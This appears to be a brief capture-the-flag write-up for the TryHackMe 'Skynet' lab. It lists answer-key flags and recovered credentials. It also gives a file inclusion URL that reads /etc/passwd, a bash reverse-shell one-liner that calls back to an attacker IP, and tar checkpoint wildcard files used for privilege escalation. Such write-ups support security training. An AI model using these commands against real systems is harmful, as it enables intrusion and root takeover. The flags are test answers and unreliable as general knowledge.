# TryHackMe Skynet

> Saikat Karmakar | AUG 1 : 2021

---

## Task 1

1. What is Miles password for his emails?
```
cyborg007haloterminator
```
2. What is the hidden directory?
```
/45kra24zxs28v3yd
```
3. What is the vulnerability called when you can include a remote file for malicious purposes?
```
remote file inclusion
```
4. What is the user flag?
```
7ce5c2109a40f958099283600a9ae807
```
5. What is the root flag?
```
3f0372db24753accc7179a282cd6a949
```


---
***Notes***

smb creds 
```
milesdyson : )s{A&2Z=F^n_E.B`
```



url http://10.10.142.116//45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=urlConfig=../../../../../../../../../etc/passwd

priv. ese : https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/

steps
```
bash -i >& /dev/tcp/10.4.23.120/1234 0>&1
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```
